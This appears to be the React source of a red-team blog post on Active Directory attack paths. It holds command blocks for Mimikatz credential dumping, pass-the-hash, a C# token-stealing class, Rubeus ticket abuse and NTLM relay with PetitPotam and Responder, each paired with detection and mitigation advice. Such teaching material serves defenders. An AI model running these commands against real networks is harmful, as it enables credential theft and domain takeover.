'use client'

import { motion } from 'framer-motion'
import { useState, useEffect } from 'react'
import DetailPageLayout from '@/components/DetailPageLayout'
import CodeBlock from '@/components/CodeBlock'
import Callout from '@/components/Callout'

export default function ADAttackPathsPost() {
  const [activeSection, setActiveSection] = useState('')

  useEffect(() => {
    const handleScroll = () => {
      const sections = ['introduction', 'attack-chain', 'pass-the-hash', 'token-manipulation', 'kerberos-delegation', 'ntlm-relay', 'detection-mitigation', 'key-takeaways']
      
      for (const section of sections) {
        const element = document.getElementById(section)
        if (element) {
          const rect = element.getBoundingClientRect()
          if (rect.top <= 100 && rect.bottom >= 100) {
            setActiveSection(section)
            break
          }
        }
      }
    }

    window.addEventListener('scroll', handleScroll)
    return () => window.removeEventListener('scroll', handleScroll)
  }, [])

  const tocSections = [
    { id: 'introduction', title: 'Introduction' },
    { id: 'attack-chain', title: 'Attack Chain Visualization' },
    { id: 'pass-the-hash', title: 'Pass-the-Hash' },
    { id: 'token-manipulation', title: 'Token Manipulation' },
    { id: 'kerberos-delegation', title: 'Kerberos Delegation Abuse' },
    { id: 'ntlm-relay', title: 'NTLM Relay' },
    { id: 'detection-mitigation', title: 'Detection & Mitigation' },
    { id: 'key-takeaways', title: 'Key Takeaways' }
  ]

  const passTheHashCode = `# Pass-the-Hash Attack Example
# This demonstrates how to use captured NTLM hashes for lateral movement

# 1. Capture NTLM hashes using tools like Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# 2. Use the captured hash for lateral movement
# Using pth-winexe (Linux)
pth-winexe -U DOMAIN/user%aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 //target-ip cmd

# Using Invoke-TheHash (PowerShell)
Import-Module Invoke-TheHash
Invoke-WMIExec -Target 192.168.1.100 -Username DOMAIN\\user -Hash aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 -Command "whoami"

# 3. Alternative using CrackMapExec
crackmapexec smb 192.168.1.0/24 -u user -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 --shares`

  const tokenManipulationCode = `// Token Manipulation in C#
// This example shows how to manipulate access tokens for privilege escalation

using System;
using System.Runtime.InteropServices;

public class TokenManipulation
{
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int ImpersonationLevel, out IntPtr DuplicateTokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    
    public static void StealToken(int processId)
    {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);
        IntPtr hToken;
        
        if (OpenProcessToken(hProcess, 0x0002, out hToken))
        {
            IntPtr hDupToken;
            if (DuplicateToken(hToken, 2, out hDupToken))
            {
                if (ImpersonateLoggedOnUser(hDupToken))
                {
                    Console.WriteLine("[+] Successfully impersonated token");
                    // Now running with stolen privileges
                }
            }
        }
    }
}`

  const kerberosDelegationCode = `# Kerberos Delegation Abuse
# This demonstrates how to abuse unconstrained delegation

# 1. Check for unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation, TrustedToAuthForDelegation

# 2. If we have admin access to a machine with unconstrained delegation
# We can capture TGTs from users who authenticate to that machine

# 3. Using Rubeus to monitor for TGTs
Rubeus.exe monitor /interval:5 /filteruser:target-user

# 4. Once we capture a TGT, we can use it
Rubeus.exe ptt /ticket:[base64-ticket]

# 5. Now we can access resources as the delegated user
dir \\\\target-server\\c$`

  const ntlmRelayCode = `# NTLM Relay Attack
# This demonstrates how to perform NTLM relay attacks

# 1. Set up the relay server using ntlmrelayx.py
python3 ntlmrelayx.py -tf targets.txt -smb2support

# 2. Trigger authentication (various methods)
# Method 1: Using PetitPotam
python3 PetitPotam.py -u username -p password -d domain.com relay-server target-dc

# Method 3: Using PrinterBug
python3 printerbug.py domain/username:password@target-server relay-server

# 3. Once relayed, we can execute commands
# The relay will automatically attempt to dump SAM, LSA secrets, etc.

# 4. Alternative using Responder + MultiRelay
# Start Responder
python3 Responder.py -I eth0

# Start MultiRelay
python3 MultiRelay.py -t target-ip -u ALL`

  const relatedPosts = [
    {
      title: "Building Evasive C2 Implants",
      excerpt: "Advanced techniques for creating command and control frameworks that evade detection.",
      date: "Jan 10, 2025",
      readTime: "8 min",
      tags: ["C2", "Evasion", "Red Team"]
    },
    {
      title: "Kernel Exploitation 101",
      excerpt: "Introduction to kernel-level exploitation and privilege escalation techniques.",
      date: "Jan 5, 2025",
      readTime: "15 min",
      tags: ["Kernel", "Exploitation", "Privilege Escalation"]
    },
    {
      title: "Active Directory Enumeration Techniques",
      excerpt: "Comprehensive guide to enumerating Active Directory environments for red team operations.",
      date: "Dec 28, 2024",
      readTime: "12 min",
      tags: ["Active Directory", "Enumeration", "Reconnaissance"]
    }
  ]

  return (
    <DetailPageLayout 
      title="Active Directory Attack Paths"
      subtitle="Comprehensive Guide to AD Privilege Escalation Techniques"
      breadcrumb={{ label: "Research", href: "/#research" }}
    >
      <div className="max-w-6xl mx-auto px-6 py-12">
        <div className="grid lg:grid-cols-4 gap-12">
          {/* Table of Contents - Sidebar */}
          <motion.div
            className="lg:col-span-1"
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.5 }}
          >
            <div className="sticky top-8">
              <h3 className="text-lg font-semibold text-white mb-4">Table of Contents</h3>
              <nav className="space-y-2">
                {tocSections.map((section) => (
                  <a
                    key={section.id}
                    href={`#${section.id}`}
                    className={`block text-sm py-2 px-3 rounded-md transition-colors ${
                      activeSection === section.id
                        ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                        : 'text-gray-400 hover:text-white hover:bg-gray-800/30'
                    }`}
                  >
                    {section.title}
                  </a>
                ))}
              </nav>
            </div>
          </motion.div>

          {/* Main Content */}
          <div className="lg:col-span-3">
            {/* Back Button */}

            {/* Hero/Header */}
            <motion.header
              className="mb-12"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8 }}
            >
              <h1 className="text-4xl lg:text-5xl font-bold text-white mb-6 leading-tight">
                Active Directory Attack Paths: A Red Team Guide
              </h1>
              
              <div className="flex flex-wrap items-center gap-4 text-sm text-gray-400 mb-6">
                <span>Jan 15, 2025</span>
                <span>•</span>
                <span>Darrius Grate</span>
                <span>•</span>
                <span>12 min read</span>
              </div>
              
              <div className="flex flex-wrap gap-2">
                {['Active Directory', 'Red Team', 'Lateral Movement', 'Privilege Escalation'].map((tag) => (
                  <span
                    key={tag}
                    className="px-3 py-1 bg-red-500/20 text-red-400 text-sm rounded-full border border-red-500/30"
                  >
                    {tag}
                  </span>
                ))}
              </div>
            </motion.header>

            {/* Introduction */}
            <motion.section
              id="introduction"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.2 }}
            >
              <h2 className="text-3xl font-bold text-white mb-6">Introduction</h2>
              <div className="prose prose-lg max-w-none">
                <p className="text-gray-300 leading-relaxed mb-6">
                  Active Directory environments are the crown jewels of most enterprise networks, 
                  making them prime targets for red team operations. Understanding the various 
                  attack paths available in AD environments is crucial for both offensive and 
                  defensive security professionals.
                </p>
                <p className="text-gray-300 leading-relaxed mb-6">
                  This comprehensive guide explores the most effective techniques for lateral 
                  movement and privilege escalation in Active Directory environments. We'll 
                  cover both well-known techniques and advanced methods that can help red 
                  teams achieve their objectives while staying under the radar.
                </p>
                <p className="text-gray-300 leading-relaxed">
                  <strong>What you'll learn:</strong> Advanced lateral movement techniques, 
                  privilege escalation methods, detection evasion strategies, and defensive 
                  countermeasures to protect your AD environment.
                </p>
              </div>
            </motion.section>

            {/* Attack Chain Visualization */}
            <motion.section
              id="attack-chain"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.3 }}
            >
              <h2 className="text-3xl font-bold text-white mb-8">Attack Chain Visualization</h2>
              <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-8">
                <div className="flex flex-col md:flex-row items-center justify-between space-y-4 md:space-y-0 md:space-x-8">
                  <div className="text-center">
                    <div className="w-16 h-16 bg-red-500/20 rounded-lg flex items-center justify-center border border-red-500/30 mx-auto mb-3">
                      <span className="text-2xl">🎯</span>
                    </div>
                    <h3 className="text-lg font-semibold text-white mb-2">Initial Access</h3>
                    <p className="text-gray-300 text-sm">Phishing, Exploits, Credential Theft</p>
                  </div>
                  
                  <div className="hidden md:block text-red-400 text-2xl">→</div>
                  
                  <div className="text-center">
                    <div className="w-16 h-16 bg-yellow-500/20 rounded-lg flex items-center justify-center border border-yellow-500/30 mx-auto mb-3">
                      <span className="text-2xl">🔄</span>
                    </div>
                    <h3 className="text-lg font-semibold text-white mb-2">Lateral Movement</h3>
                    <p className="text-gray-300 text-sm">Pass-the-Hash, Token Manipulation</p>
                  </div>
                  
                  <div className="hidden md:block text-red-400 text-2xl">→</div>
                  
                  <div className="text-center">
                    <div className="w-16 h-16 bg-purple-500/20 rounded-lg flex items-center justify-center border border-purple-500/30 mx-auto mb-3">
                      <span className="text-2xl">⬆️</span>
                    </div>
                    <h3 className="text-lg font-semibold text-white mb-2">Privilege Escalation</h3>
                    <p className="text-gray-300 text-sm">Kerberos Delegation, NTLM Relay</p>
                  </div>
                  
                  <div className="hidden md:block text-red-400 text-2xl">→</div>
                  
                  <div className="text-center">
                    <div className="w-16 h-16 bg-green-500/20 rounded-lg flex items-center justify-center border border-green-500/30 mx-auto mb-3">
                      <span className="text-2xl">👑</span>
                    </div>
                    <h3 className="text-lg font-semibold text-white mb-2">Domain Admin</h3>
                    <p className="text-gray-300 text-sm">Full Domain Compromise</p>
                  </div>
                </div>
              </div>
            </motion.section>

            {/* Pass-the-Hash */}
            <motion.section
              id="pass-the-hash"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.4 }}
            >
              <h2 className="text-3xl font-bold text-white mb-6">Pass-the-Hash</h2>
              <div className="prose prose-lg max-w-none mb-8">
                <p className="text-gray-300 leading-relaxed mb-6">
                  Pass-the-Hash (PtH) is one of the most well-known lateral movement techniques 
                  in Active Directory environments. It allows attackers to authenticate to 
                  remote systems using NTLM hashes instead of plaintext passwords.
                </p>
                <p className="text-gray-300 leading-relaxed mb-6">
                  This technique is particularly effective because it doesn't require password 
                  cracking and can be used even when the original password has been changed, 
                  as long as the hash remains valid.
                </p>
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Implementation</h3>
                <CodeBlock
                  code={passTheHashCode}
                  language="powershell"
                  title="Pass-the-Hash Attack Example"
                />
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Detection Methods</h3>
                <div className="grid md:grid-cols-2 gap-6">
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Event Logs</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Event ID 4624 (Successful logon)</li>
                      <li>• Event ID 4625 (Failed logon)</li>
                      <li>• Look for NTLM authentication patterns</li>
                      <li>• Monitor for unusual logon types</li>
                    </ul>
                  </div>
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Network Monitoring</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Monitor SMB authentication traffic</li>
                      <li>• Look for NTLM hash usage patterns</li>
                      <li>• Analyze authentication timing</li>
                      <li>• Check for lateral movement indicators</li>
                    </ul>
                  </div>
                </div>
              </div>
            </motion.section>

            {/* Token Manipulation */}
            <motion.section
              id="token-manipulation"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.5 }}
            >
              <h2 className="text-3xl font-bold text-white mb-6">Token Manipulation</h2>
              <div className="prose prose-lg max-w-none mb-8">
                <p className="text-gray-300 leading-relaxed mb-6">
                  Token manipulation involves stealing or duplicating access tokens from other 
                  processes to gain their privileges. This technique is particularly effective 
                  for privilege escalation and lateral movement.
                </p>
                <p className="text-gray-300 leading-relaxed mb-6">
                  Windows access tokens contain security information about a user's identity 
                  and privileges. By manipulating these tokens, attackers can impersonate 
                  other users or elevate their privileges.
                </p>
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Implementation</h3>
                <CodeBlock
                  code={tokenManipulationCode}
                  language="csharp"
                  title="Token Manipulation in C#"
                />
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Detection Methods</h3>
                <Callout type="warning" title="Detection Challenges">
                  Token manipulation can be difficult to detect as it often appears as normal 
                  process behavior. Look for unusual process relationships and privilege 
                  escalation patterns.
                </Callout>
                <div className="grid md:grid-cols-2 gap-6 mt-6">
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Process Monitoring</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Monitor for unusual process relationships</li>
                      <li>• Check for token duplication events</li>
                      <li>• Look for privilege escalation patterns</li>
                      <li>• Analyze process creation chains</li>
                    </ul>
                  </div>
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Behavioral Analysis</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Monitor for sudden privilege changes</li>
                      <li>• Check for unusual authentication patterns</li>
                      <li>• Analyze process memory access</li>
                      <li>• Look for API hooking indicators</li>
                    </ul>
                  </div>
                </div>
              </div>
            </motion.section>

            {/* Kerberos Delegation Abuse */}
            <motion.section
              id="kerberos-delegation"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.6 }}
            >
              <h2 className="text-3xl font-bold text-white mb-6">Kerberos Delegation Abuse</h2>
              <div className="prose prose-lg max-w-none mb-8">
                <p className="text-gray-300 leading-relaxed mb-6">
                  Kerberos delegation allows a service to impersonate a user to access other 
                  services on their behalf. When misconfigured, this can be abused for 
                  privilege escalation and lateral movement.
                </p>
                <p className="text-gray-300 leading-relaxed mb-6">
                  Unconstrained delegation is particularly dangerous as it allows a service 
                  to impersonate users to any service in the domain, potentially leading to 
                  domain compromise.
                </p>
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Implementation</h3>
                <CodeBlock
                  code={kerberosDelegationCode}
                  language="powershell"
                  title="Kerberos Delegation Abuse"
                />
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Detection Methods</h3>
                <div className="grid md:grid-cols-2 gap-6">
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">AD Configuration</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Audit delegation settings regularly</li>
                      <li>• Check for unconstrained delegation</li>
                      <li>• Monitor delegation changes</li>
                      <li>• Review service account permissions</li>
                    </ul>
                  </div>
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Kerberos Events</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Monitor Kerberos ticket requests</li>
                      <li>• Check for delegation ticket usage</li>
                      <li>• Look for unusual service requests</li>
                      <li>• Analyze ticket lifetime patterns</li>
                    </ul>
                  </div>
                </div>
              </div>
            </motion.section>

            {/* NTLM Relay */}
            <motion.section
              id="ntlm-relay"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.7 }}
            >
              <h2 className="text-3xl font-bold text-white mb-6">NTLM Relay</h2>
              <div className="prose prose-lg max-w-none mb-8">
                <p className="text-gray-300 leading-relaxed mb-6">
                  NTLM relay attacks intercept and relay NTLM authentication attempts to 
                  other systems, allowing attackers to authenticate as the victim user 
                  without knowing their password.
                </p>
                <p className="text-gray-300 leading-relaxed mb-6">
                  This technique is particularly effective in environments where NTLM 
                  authentication is still enabled, as it can lead to lateral movement 
                  and privilege escalation.
                </p>
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Implementation</h3>
                <CodeBlock
                  code={ntlmRelayCode}
                  language="bash"
                  title="NTLM Relay Attack Setup"
                />
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Detection Methods</h3>
                <Callout type="error" title="Critical Security Issue">
                  NTLM relay attacks can be devastating if successful. Ensure SMB signing 
                  is enabled and consider disabling NTLM authentication where possible.
                </Callout>
                <div className="grid md:grid-cols-2 gap-6 mt-6">
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Network Security</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Enable SMB signing on all systems</li>
                      <li>• Monitor for relay attack patterns</li>
                      <li>• Check for unusual authentication flows</li>
                      <li>• Analyze network traffic patterns</li>
                    </ul>
                  </div>
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Authentication Monitoring</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Monitor NTLM authentication events</li>
                      <li>• Check for authentication from unexpected sources</li>
                      <li>• Look for rapid authentication attempts</li>
                      <li>• Analyze authentication timing patterns</li>
                    </ul>
                  </div>
                </div>
              </div>
            </motion.section>

            {/* Detection & Mitigation */}
            <motion.section
              id="detection-mitigation"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.8 }}
            >
              <h2 className="text-3xl font-bold text-white mb-8">Detection & Mitigation</h2>
              
              <div className="grid md:grid-cols-2 gap-8 mb-8">
                <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                  <h3 className="text-xl font-semibold text-white mb-4">Monitoring Strategies</h3>
                  <ul className="text-gray-300 space-y-3">
                    <li>• <strong>SIEM Integration:</strong> Centralize security event monitoring</li>
                    <li>• <strong>Behavioral Analytics:</strong> Detect anomalous authentication patterns</li>
                    <li>• <strong>Network Monitoring:</strong> Analyze traffic for attack indicators</li>
                    <li>• <strong>Endpoint Detection:</strong> Monitor for suspicious process behavior</li>
                  </ul>
                </div>
                
                <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                  <h3 className="text-xl font-semibold text-white mb-4">Defensive Tools</h3>
                  <ul className="text-gray-300 space-y-3">
                    <li>• <strong>Microsoft Defender:</strong> Advanced threat protection</li>
                    <li>• <strong>CrowdStrike Falcon:</strong> Endpoint detection and response</li>
                    <li>• <strong>BloodHound:</strong> AD attack path analysis</li>
                    <li>• <strong>Azure Sentinel:</strong> Cloud-native SIEM</li>
                  </ul>
                </div>
              </div>

              <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                <h3 className="text-xl font-semibold text-white mb-4">Best Practices</h3>
                <div className="grid md:grid-cols-2 gap-6">
                  <div>
                    <h4 className="text-lg font-semibold text-white mb-3">Prevention</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Implement least privilege access</li>
                      <li>• Enable SMB signing</li>
                      <li>• Disable NTLM where possible</li>
                      <li>• Regular security assessments</li>
                      <li>• Patch management</li>
                    </ul>
                  </div>
                  <div>
                    <h4 className="text-lg font-semibold text-white mb-3">Response</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Incident response procedures</li>
                      <li>• Forensic analysis capabilities</li>
                      <li>• Threat hunting programs</li>
                      <li>• Regular security training</li>
                      <li>• Continuous monitoring</li>
                    </ul>
                  </div>
                </div>
              </div>
            </motion.section>

            {/* Key Takeaways */}
            <motion.section
              id="key-takeaways"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.9 }}
            >
              <h2 className="text-3xl font-bold text-white mb-8">Key Takeaways</h2>
              
              <Callout type="success" title="Action Items for Defenders">
                <ul className="space-y-2">
                  <li>• <strong>Audit AD configurations</strong> regularly for delegation and ACL issues</li>
                  <li>• <strong>Enable SMB signing</strong> and consider disabling NTLM authentication</li>
                  <li>• <strong>Implement least privilege</strong> access controls throughout the environment</li>
                  <li>• <strong>Monitor authentication events</strong> for unusual patterns and lateral movement</li>
                  <li>• <strong>Conduct regular red team exercises</strong> to test defensive capabilities</li>
                </ul>
              </Callout>

              <div className="mt-8">
                <h3 className="text-xl font-semibold text-white mb-4">Summary</h3>
                <p className="text-gray-300 leading-relaxed">
                  Active Directory attack paths represent some of the most sophisticated 
                  techniques in red team operations. Understanding these methods is crucial 
                  for both offensive and defensive security professionals. By implementing 
                  proper monitoring, access controls, and security practices, organizations 
                  can significantly reduce their attack surface and improve their security 
                  posture against these advanced threats.
                </p>
              </div>
            </motion.section>

            {/* Related Content */}
            <motion.section
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 1.0 }}
            >
              <h2 className="text-3xl font-bold text-white mb-8">Continue Reading</h2>
              <div className="grid md:grid-cols-3 gap-6">
                {relatedPosts.map((post, index) => (
                  <motion.div
                    key={post.title}
                    className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6 hover:border-red-500/30 transition-colors"
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ duration: 0.6, delay: 1.1 + index * 0.1 }}
                    whileHover={{ scale: 1.02 }}
                  >
                    <h3 className="text-lg font-semibold text-white mb-3 hover:text-red-400 transition-colors">
                      {post.title}
                    </h3>
                    <p className="text-gray-300 text-sm leading-relaxed mb-4">
                      {post.excerpt}
                    </p>
                    <div className="flex items-center justify-between text-xs text-gray-400">
                      <span>{post.date}</span>
                      <span>{post.readTime}</span>
                    </div>
                    <div className="flex flex-wrap gap-1 mt-3">
                      {post.tags.map((tag) => (
                        <span
                          key={tag}
                          className="px-2 py-1 bg-gray-700/50 text-gray-300 text-xs rounded"
                        >
                          {tag}
                        </span>
                      ))}
                    </div>
                  </motion.div>
                ))}
              </div>
            </motion.section>

            {/* Footer */}
            <motion.div
              className="border-t border-gray-700/50 pt-8"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 1.1 }}
            >
              <div className="flex flex-col md:flex-row items-center justify-between space-y-4 md:space-y-0">
                <div className="flex items-center space-x-6">
                  <button className="flex items-center space-x-2 text-gray-400 hover:text-white transition-colors">
                    <span className="text-xl">🐦</span>
                    <span>Share on Twitter</span>
                  </button>
                  <button className="flex items-center space-x-2 text-gray-400 hover:text-white transition-colors">
                    <span className="text-xl">💼</span>
                    <span>Share on LinkedIn</span>
                  </button>
                  <button className="flex items-center space-x-2 text-gray-400 hover:text-white transition-colors">
                    <span className="text-xl">📋</span>
                    <span>Copy Link</span>
                  </button>
                </div>
                
                <div className="flex items-center space-x-4">
                  <div className="w-12 h-12 bg-red-500/20 rounded-full border border-red-500/30 flex items-center justify-center">
                    <span className="text-xl">👨‍💻</span>
                  </div>
                  <div>
                    <h4 className="text-sm font-semibold text-white">Darrius Grate</h4>
                    <p className="text-xs text-gray-400">Red Team Security Researcher</p>
                  </div>
                </div>
              </div>
            </motion.div>
          </div>
        </div>
      </div>
    </DetailPageLayout>
  )
}
